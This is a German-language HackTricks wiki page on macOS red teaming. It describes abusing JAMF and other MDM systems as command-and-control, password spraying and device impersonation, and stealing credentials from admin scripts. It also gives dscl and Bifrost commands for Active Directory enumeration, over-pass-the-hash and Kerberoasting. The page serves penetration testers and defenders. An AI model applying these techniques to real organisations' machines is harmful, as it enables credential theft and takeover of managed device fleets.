# macOS Red Teaming

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### Erhalte die Perspektive eines Hackers auf deine Webanwendungen, Netzwerke und Cloud

**Finde und melde kritische, ausnutzbare Schwachstellen mit echtem Geschäftsauswirkungen.** Nutze unsere 20+ benutzerdefinierten Tools, um die Angriffsfläche zu kartieren, Sicherheitsprobleme zu finden, die dir ermöglichen, Privilegien zu eskalieren, und verwende automatisierte Exploits, um wesentliche Beweise zu sammeln, die deine harte Arbeit in überzeugende Berichte verwandeln.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Missbrauch von MDMs

* JAMF Pro: `jamf checkJSSConnection`
* Kandji

Wenn es dir gelingt, **Admin-Anmeldeinformationen zu kompromittieren**, um auf die Verwaltungsplattform zuzugreifen, kannst du **potenziell alle Computer kompromittieren**, indem du deine Malware auf den Maschinen verteilst.

Für Red Teaming in macOS-Umgebungen wird dringend empfohlen, ein gewisses Verständnis dafür zu haben, wie die MDMs funktionieren:

{% content-ref url="macos-mdm/" %}
[macos-mdm](macos-mdm/)
{% endcontent-ref %}

### Verwendung von MDM als C2

Ein MDM hat die Berechtigung, Profile zu installieren, abzufragen oder zu entfernen, Anwendungen zu installieren, lokale Administratorkonten zu erstellen, das Firmware-Passwort festzulegen, den FileVault-Schlüssel zu ändern...

Um dein eigenes MDM zu betreiben, musst du **dein CSR von einem Anbieter signieren lassen**, was du versuchen könntest, mit [**https://mdmcert.download/**](https://mdmcert.download/). Und um dein eigenes MDM für Apple-Geräte zu betreiben, könntest du [**MicroMDM**](https://github.com/micromdm/micromdm) verwenden.

Um jedoch eine Anwendung auf einem registrierten Gerät zu installieren, musst du sie immer noch von einem Entwicklerkonto signieren lassen... jedoch fügt das **Gerät beim MDM-Registrierungsprozess das SSL-Zertifikat des MDM als vertrauenswürdige CA hinzu**, sodass du jetzt alles signieren kannst.

Um das Gerät in ein MDM zu registrieren, musst du eine **`mobileconfig`**-Datei als Root installieren, die über eine **pkg**-Datei bereitgestellt werden könnte (du könntest sie in zip komprimieren und wenn sie von Safari heruntergeladen wird, wird sie dekomprimiert).

**Mythic agent Orthrus** verwendet diese Technik.

### Missbrauch von JAMF PRO

JAMF kann **benutzerdefinierte Skripte** (Skripte, die vom Sysadmin entwickelt wurden), **native Payloads** (Erstellung lokaler Konten, EFI-Passwort festlegen, Datei-/Prozessüberwachung...) und **MDM** (Gerätekonfigurationen, Gerätezertifikate...) ausführen.

#### JAMF Selbstregistrierung

Gehe zu einer Seite wie `https://<company-name>.jamfcloud.com/enroll/`, um zu sehen, ob sie **Selbstregistrierung aktiviert haben**. Wenn sie es haben, könnte es **nach Anmeldeinformationen fragen**.

Du könntest das Skript [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) verwenden, um einen Passwort-Spraying-Angriff durchzuführen.

Darüber hinaus könntest du, nachdem du die richtigen Anmeldeinformationen gefunden hast, in der Lage sein, andere Benutzernamen mit dem nächsten Formular zu brute-forcen:

![](<../../.gitbook/assets/image (107).png>)

#### JAMF Geräteauthentifizierung

<figure><img src="../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

Die **`jamf`**-Binärdatei enthielt das Geheimnis, um den Schlüsselbund zu öffnen, das zum Zeitpunkt der Entdeckung **unter allen geteilt** wurde und war: **`jk23ucnq91jfu9aj`**.\
Darüber hinaus **persistiert** jamf als **LaunchDaemon** in **`/Library/LaunchAgents/com.jamf.management.agent.plist`**.

#### JAMF Geräteübernahme

Die **JSS** (Jamf Software Server) **URL**, die **`jamf`** verwenden wird, befindet sich in **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Diese Datei enthält im Wesentlichen die URL:

{% code overflow="wrap" %}
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
{% endcode %}

Ein Angreifer könnte also ein bösartiges Paket (`pkg`) ablegen, das **diese Datei überschreibt**, wenn es installiert wird, und die **URL auf einen Mythic C2-Listener von einem Typhon-Agenten** setzt, um JAMF jetzt als C2 auszunutzen.

{% code overflow="wrap" %}
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
{% endcode %}

#### JAMF-Imitation

Um die **Kommunikation** zwischen einem Gerät und JMF zu **imitieren**, benötigen Sie:

* Die **UUID** des Geräts: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
* Den **JAMF-Schlüsselbund** von: `/Library/Application\ Support/Jamf/JAMF.keychain`, der das Gerätezertifikat enthält

Mit diesen Informationen **erstellen Sie eine VM** mit der **gestohlenen** Hardware-**UUID** und mit **deaktiviertem SIP**, legen Sie den **JAMF-Schlüsselbund** ab, **haken** Sie den Jamf **Agenten** und stehlen Sie dessen Informationen.

#### Geheimnisse stehlen

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Sie könnten auch den Speicherort `/Library/Application Support/Jamf/tmp/` überwachen, um die **benutzerdefinierten Skripte** zu finden, die Administratoren möglicherweise über Jamf ausführen möchten, da sie **hier platziert, ausgeführt und entfernt** werden. Diese Skripte **könnten Anmeldeinformationen enthalten**.

Allerdings könnten **Anmeldeinformationen** diesen Skripten als **Parameter** übergeben werden, sodass Sie `ps aux | grep -i jamf` überwachen müssten (ohne sogar root zu sein).

Das Skript [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) kann auf neue hinzugefügte Dateien und neue Prozessargumente hören.

### macOS Remote-Zugriff

Und auch über **MacOS** "besondere" **Netzwerk** **Protokolle**:

{% content-ref url="../macos-security-and-privilege-escalation/macos-protocols.md" %}
[macos-protocols.md](../macos-security-and-privilege-escalation/macos-protocols.md)
{% endcontent-ref %}

## Active Directory

In einigen Fällen werden Sie feststellen, dass der **MacOS-Computer mit einem AD verbunden ist**. In diesem Szenario sollten Sie versuchen, das Active Directory zu **enumerieren**, wie Sie es gewohnt sind. Finden Sie etwas **Hilfe** auf den folgenden Seiten:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/active-directory-methodology/" %}
[active-directory-methodology](../../windows-hardening/active-directory-methodology/)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-kerberos-88/" %}
[pentesting-kerberos-88](../../network-services-pentesting/pentesting-kerberos-88/)
{% endcontent-ref %}

Ein **lokales MacOS-Tool**, das Ihnen ebenfalls helfen kann, ist `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Auch gibt es einige Tools für MacOS, um automatisch das AD zu enumerieren und mit Kerberos zu spielen:

* [**Machound**](https://github.com/XMCyber/MacHound): MacHound ist eine Erweiterung des Bloodhound-Audit-Tools, das das Sammeln und Verarbeiten von Active Directory-Beziehungen auf MacOS-Hosts ermöglicht.
* [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost ist ein Objective-C-Projekt, das entwickelt wurde, um mit den Heimdal krb5 APIs auf macOS zu interagieren. Das Ziel des Projekts ist es, bessere Sicherheitstests rund um Kerberos auf macOS-Geräten unter Verwendung nativer APIs zu ermöglichen, ohne dass andere Frameworks oder Pakete auf dem Ziel erforderlich sind.
* [**Orchard**](https://github.com/its-a-feature/Orchard): JavaScript für Automatisierung (JXA) Tool zur Durchführung der Active Directory-Enumeration.

### Domain-Informationen
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Benutzer

Die drei Arten von MacOS-Benutzern sind:

* **Lokale Benutzer** — Verwaltet durch den lokalen OpenDirectory-Dienst, sie sind in keiner Weise mit dem Active Directory verbunden.
* **Netzwerkbenutzer** — Flüchtige Active Directory-Benutzer, die eine Verbindung zum DC-Server benötigen, um sich zu authentifizieren.
* **Mobile Benutzer** — Active Directory-Benutzer mit einer lokalen Sicherung ihrer Anmeldeinformationen und Dateien.

Die lokalen Informationen über Benutzer und Gruppen werden im Ordner _/var/db/dslocal/nodes/Default._ gespeichert.\
Zum Beispiel werden die Informationen über den Benutzer namens _mark_ in _/var/db/dslocal/nodes/Default/users/mark.plist_ und die Informationen über die Gruppe _admin_ in _/var/db/dslocal/nodes/Default/groups/admin.plist_ gespeichert.

Neben der Verwendung der HasSession- und AdminTo-Kanten fügt **MacHound drei neue Kanten** zur Bloodhound-Datenbank hinzu:

* **CanSSH** - Entität, die SSH zum Host verwenden darf
* **CanVNC** - Entität, die VNC zum Host verwenden darf
* **CanAE** - Entität, die AppleEvent-Skripte auf dem Host ausführen darf
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Mehr Informationen unter [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ Passwort

Passwörter abrufen mit:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Es ist möglich, das **`Computer$`** Passwort im System-Schlüsselbund zuzugreifen.

### Over-Pass-The-Hash

Holen Sie sich ein TGT für einen bestimmten Benutzer und Dienst:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Sobald das TGT gesammelt ist, ist es möglich, es in die aktuelle Sitzung mit einzufügen:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Mit erhaltenen Diensttickets ist es möglich, auf Freigaben auf anderen Computern zuzugreifen:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Zugriff auf den Schlüsselbund

Der Schlüsselbund enthält höchstwahrscheinlich sensible Informationen, die, wenn sie ohne Aufforderung zuzugreifen, dazu beitragen könnten, eine Red Team Übung voranzutreiben:

{% content-ref url="macos-keychain.md" %}
[macos-keychain.md](macos-keychain.md)
{% endcontent-ref %}

## Externe Dienste

MacOS Red Teaming unterscheidet sich von einem regulären Windows Red Teaming, da **MacOS normalerweise direkt mit mehreren externen Plattformen integriert ist**. Eine gängige Konfiguration von MacOS besteht darin, auf den Computer mit **OneLogin synchronisierten Anmeldeinformationen zuzugreifen und mehrere externe Dienste** (wie github, aws...) über OneLogin zu nutzen.

## Verschiedene Red Team Techniken

### Safari

Wenn eine Datei in Safari heruntergeladen wird und es sich um eine "sichere" Datei handelt, wird sie **automatisch geöffnet**. Wenn Sie beispielsweise **eine Zip-Datei herunterladen**, wird sie automatisch entpackt:

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

## Referenzen

* [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
* [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
* [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
* [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
* [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)

<figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

#### Holen Sie sich die Perspektive eines Hackers auf Ihre Webanwendungen, Ihr Netzwerk und die Cloud

**Finden und melden Sie kritische, ausnutzbare Schwachstellen mit echtem Geschäftsauswirkungen.** Verwenden Sie unsere 20+ benutzerdefinierten Tools, um die Angriffsfläche zu kartieren, Sicherheitsprobleme zu finden, die Ihnen ermöglichen, Berechtigungen zu eskalieren, und automatisierte Exploits zu verwenden, um wesentliche Beweise zu sammeln und Ihre harte Arbeit in überzeugende Berichte umzuwandeln.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
